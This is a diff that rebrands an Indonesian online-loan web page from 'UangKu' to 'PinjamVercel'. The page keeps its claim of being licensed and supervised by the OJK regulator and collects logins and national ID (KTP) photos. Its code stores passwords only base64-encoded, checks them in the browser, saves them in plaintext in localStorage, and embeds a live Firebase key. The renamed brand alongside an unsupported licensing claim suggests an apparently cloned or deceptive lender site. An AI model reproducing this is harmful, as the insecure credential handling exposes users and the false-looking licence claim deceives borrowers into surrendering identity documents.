@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>UangKu - Pinjaman Online Cepat & Aman</title>
+<title>PinjamVercel - Pinjaman Online Cepat & Aman</title>
 <!-- Library EmailJS -->
 <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
 <script type="text/javascript">
@@ -20,16 +20,17 @@
 
   /* HOME */
   #home-page { padding-bottom: 70px; display: block; }
-  .header-bg { background: linear-gradient(135deg, #38d16a, #2eb85c); padding: 30px 20px 80px 20px; border-bottom-left-radius: 20px; border-bottom-right-radius: 20px; position: relative; }
+  .header-bg { background: linear-gradient(135deg, #38d16a, #2eb85c); padding: 20px 20px 80px 20px; border-bottom-left-radius: 20px; border-bottom-right-radius: 20px; position: relative; }
   .nav-header { display: flex; justify-content: space-between; align-items: center; color: white; }
-  .logo-area { display: flex; align-items: center; gap: 8px; font-weight: 800; font-size: 22px; letter-spacing: 0.5px; }
   
-  /* CSS UNTUK LOGO GAMBAR */
+  /* AREA LOGO (TANPA TEKS) */
+  .logo-area { display: flex; align-items: center; }
   .logo-img { 
-    height: 35px; 
+    height: 50px; 
     width: auto; 
+    max-width: 220px;
     object-fit: contain; 
-    filter: drop-shadow(0 2px 4px rgba(0,0,0,0.1)); 
+    filter: drop-shadow(0 2px 4px rgba(0,0,0,0.15)); 
   }
 
   .headset-icon { font-size: 24px; cursor: pointer; }
@@ -148,10 +149,9 @@
   <div id="home-page">
     <div class="header-bg">
       <div class="nav-header">
-        <!-- LOGO GAMBAR DARI GITHUB -->
+        <!-- LOGO GAMBAR SAJA (TANPA TEKS) -->
         <div class="logo-area">
-          <img src="logo.png" alt="Logo UangKu" class="logo-img">
-          UangKu
+          <img src="logo.png" alt="PinjamVercel" class="logo-img">
         </div>
         <div class="headset-icon">🎧</div>
       </div>
@@ -170,7 +170,7 @@
       
       <div class="ojk-badge">
         <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg>
-        <b>UangKu</b> telah berizin dan diawasi oleh OJK
+        <b>PinjamVercel</b> telah berizin dan diawasi oleh OJK
       </div>
     </div>
     <div class="section-card">
@@ -211,7 +211,7 @@
     </div>
   </div>
 
-  <!-- AUTH PAGE -->
+  <!-- AUTH PAGE (LOGIN & DAFTAR) -->
   <div id="auth-page">
     <div class="auth-hero">
       <div class="auth-title">Daftar dan Login untuk Nikmati</div>
@@ -268,11 +268,11 @@
         <div class="terms-area">
           <label class="checkbox-item">
             <input type="checkbox" id="cb1">
-            <span>Saya telah membaca dan menyetujui <a href="#">Kebijakan Privasi</a>, <a href="#">Ketentuan Penggunaan</a> dan <a href="#">Otorisasi</a> dari UangKu</span>
+            <span>Saya telah membaca dan menyetujui <a href="#">Kebijakan Privasi</a>, <a href="#">Ketentuan Penggunaan</a> dan <a href="#">Otorisasi</a> dari PinjamVercel</span>
           </label>
           <label class="checkbox-item">
             <input type="checkbox" id="cb2">
-            <span>Saya setuju menerima informasi promosi dari UangKu (termasuk di luar jam kerja dan hari libur).</span>
+            <span>Saya setuju menerima informasi promosi dari PinjamVercel (termasuk di luar jam kerja dan hari libur).</span>
           </label>
           <label class="checkbox-item">
             <input type="checkbox" id="cb3">
@@ -344,7 +344,7 @@
       <button class="btn-photo" onclick="selesaiUploadKTP()">Ambil Foto</button>
       <div class="ojk-bottom">
         <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg>
-        UangKu telah berizin dan diawasi oleh OJK.
+        PinjamVercel telah berizin dan diawasi oleh OJK.
       </div>
     </div>
   </div>
@@ -355,6 +355,7 @@
   import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
   import { getFirestore, doc, getDoc, setDoc, updateDoc, initializeFirestore } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
 
+  // KONFIGURASI FIREBASE ANDA (TIDAK DIUBAH)
   const firebaseConfig = {
     apiKey: "AIzaSyBmbLud-MLYWIG8FFAFOkE4rud-iRSKR9w",
     authDomain: "uangku-9013e.firebaseapp.com",
@@ -379,8 +380,9 @@
   let hitungMundur;
   let sisaWaktu = 60; 
   
-  let currentUser = localStorage.getItem('uangku_current_user');
-  let isKtpUploaded = localStorage.getItem('uangku_ktp_status') === 'true';
+  // MENGGUNAKAN NAMA VARIABEL PINJAMVERCEL
+  let currentUser = localStorage.getItem('pinjamvercel_current_user');
+  let isKtpUploaded = localStorage.getItem('pinjamvercel_ktp_status') === 'true';
 
   // ==========================================
   // FUNGSI UI
@@ -416,8 +418,8 @@
     document.getElementById('home-page').style.display = 'none';
     document.getElementById('auth-page').style.display = 'flex';
     
-    let savedEmail = localStorage.getItem('uangku_remember_email');
-    let savedPass = localStorage.getItem('uangku_remember_pass');
+    let savedEmail = localStorage.getItem('pinjamvercel_remember_email');
+    let savedPass = localStorage.getItem('pinjamvercel_remember_pass');
     if (savedEmail && savedPass) {
       document.getElementById('login-email').value = savedEmail;
       document.getElementById('login-password').value = savedPass;
@@ -540,12 +542,12 @@
         createdAt: new Date().toISOString()
       });
       
-      localStorage.setItem('uangku_current_user', email);
-      localStorage.setItem('uangku_ktp_status', 'false');
+      localStorage.setItem('pinjamvercel_current_user', email);
+      localStorage.setItem('pinjamvercel_ktp_status', 'false');
       currentUser = email;
       isKtpUploaded = false;
       
-      alert("Pendaftaran Berhasil! Selamat datang.");
+      alert("Pendaftaran Berhasil! Selamat datang di PinjamVercel.");
       kembaliKeHome(); 
     } catch (error) {
       alert("Gagal mendaftar: " + error.message); 
@@ -581,15 +583,15 @@
         if (dataUser.password === btoa(password)) {
           
           if (remember) {
-            localStorage.setItem('uangku_remember_email', email);
-            localStorage.setItem('uangku_remember_pass', password);
+            localStorage.setItem('pinjamvercel_remember_email', email);
+            localStorage.setItem('pinjamvercel_remember_pass', password);
           } else {
-            localStorage.removeItem('uangku_remember_email');
-            localStorage.removeItem('uangku_remember_pass');
+            localStorage.removeItem('pinjamvercel_remember_email');
+            localStorage.removeItem('pinjamvercel_remember_pass');
           }
 
-          localStorage.setItem('uangku_current_user', email);
-          localStorage.setItem('uangku_ktp_status', dataUser.isKtpUploaded || false);
+          localStorage.setItem('pinjamvercel_current_user', email);
+          localStorage.setItem('pinjamvercel_ktp_status', dataUser.isKtpUploaded || false);
           currentUser = email;
           isKtpUploaded = dataUser.isKtpUploaded || false;
           
@@ -631,7 +633,7 @@
         ktpUploadedAt: new Date().toISOString()
       });
       
-      localStorage.setItem('uangku_ktp_status', 'true');
+      localStorage.setItem('pinjamvercel_ktp_status', 'true');
       isKtpUploaded = true;
       
       alert("Data KTP berhasil disimpan! Sekarang Anda bisa mengajukan pinjaman.");
